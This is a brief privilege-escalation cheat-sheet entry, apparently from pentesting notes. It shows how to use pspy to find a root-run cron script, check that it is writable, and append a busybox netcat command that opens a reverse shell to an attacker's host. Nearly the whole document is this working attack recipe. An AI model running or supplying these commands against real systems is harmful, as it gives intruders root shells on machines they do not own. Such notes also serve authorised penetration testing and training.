# Writable Cron Script (pspy)

```bash
./pspy64                                    # watch for root-owned scheduled processes
ls -la <script-pspy-showed>                 # confirm it's writable by you
echo 'busybox nc <LHOST> <LPORT> -e sh' >> <script>
# wait for the next cron run
```
